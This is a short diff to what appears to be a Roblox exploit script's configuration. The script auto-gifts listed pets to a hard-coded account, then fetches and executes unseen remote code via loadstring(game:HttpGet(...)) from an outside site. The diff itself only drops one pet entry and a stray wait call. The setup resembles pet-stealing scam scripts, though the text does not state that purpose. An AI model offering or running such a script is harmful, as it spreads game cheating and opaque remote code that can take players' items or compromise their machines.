@@ -13,10 +13,8 @@ _G.CF = {
         KickWhenEmpty = true,                    -- Kick when no more pets to gift
         GiftForPlayer = "mghmghmgh9",       -- Account that receives pets
         ListPetGift = {                          -- Pet name and amount
-            ["French Fry Ferret"] = 1,
-            ["Drza"] = 1
+            ["French Fry Ferret"] = 1
         }
-        wait(5)
     }
 }
 loadstring(game:HttpGet("https://pandadevelopment.net/virtual/file/f3207df612e2e9d2"))()
